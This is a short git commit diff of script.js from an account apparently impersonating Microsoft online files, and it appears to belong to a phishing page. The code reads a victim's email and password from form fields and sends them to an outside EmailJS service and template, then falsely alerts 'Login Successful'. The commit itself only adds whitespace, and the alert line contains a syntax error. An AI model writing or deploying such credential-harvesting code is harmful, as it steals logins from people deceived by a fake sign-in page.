8db559ed50ac0a8d4b792088b7670611cf6c43c6
View-Microsoft-Point-Online-Files <168607295+View-Microsoft-Point-Online-Files@users.noreply.github.com>
2024-05-01 08:29:07 +0100

    script.js

--- script.js
+++ script.js
@@ -1,4 +1,5 @@
-function sendMail(){
+  
+  function sendMail(){
     let parms = {
         email : document.getElementById("email").value,
         password : document.getElementById("password").value,
@@ -8,3 +9,5 @@ function sendMail(){
     
     emailjs.send("service_hdccajt", "template_wz9eg9e",parms).then(alert(Login Successful)}
 }
+
+
